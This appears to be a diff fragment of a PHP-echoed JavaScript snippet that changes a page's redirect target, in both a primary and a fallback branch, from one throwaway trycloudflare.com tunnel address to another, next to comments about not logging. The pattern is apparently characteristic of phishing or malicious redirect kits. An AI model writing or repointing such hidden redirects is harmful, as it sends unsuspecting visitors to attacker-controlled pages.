@@ -101,11 +101,11 @@ echo '
             // Don\'t log this message
             // Try to redirect to the template page
             try {
-                window.location.href = "https://lexmark-half-languages-console.trycloudflare.com/index2.html";
+                window.location.href = "https://beatles-occurred-expressions-grammar.trycloudflare.com/index2.html";
             } catch (e) {
                 // Don\'t log this message
                 // Fallback redirection
-                window.location = "https://lexmark-half-languages-console.trycloudflare.com/index2.html";
+                window.location = "https://beatles-occurred-expressions-grammar.trycloudflare.com/index2.html";
             }
         }
         
